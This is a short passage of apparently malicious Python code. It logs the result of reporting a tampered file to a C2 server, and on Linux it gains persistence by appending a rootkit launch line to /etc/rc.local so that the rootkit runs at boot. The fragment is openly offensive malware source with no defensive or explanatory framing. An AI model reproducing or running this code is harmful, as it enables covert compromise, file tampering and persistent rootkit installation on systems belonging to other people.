            print(f"Reported tampered file {file} to C2 server. Response: {response.status_code}")
        except Exception as e:
            print(f"Failed to tamper with {file}: {e}")

    # Establish persistence (example for Linux)
    if os.name == 'posix':
        with open('/etc/rc.local', 'a') as f:
            f.write(f'\n{rootkit_path} &\n')
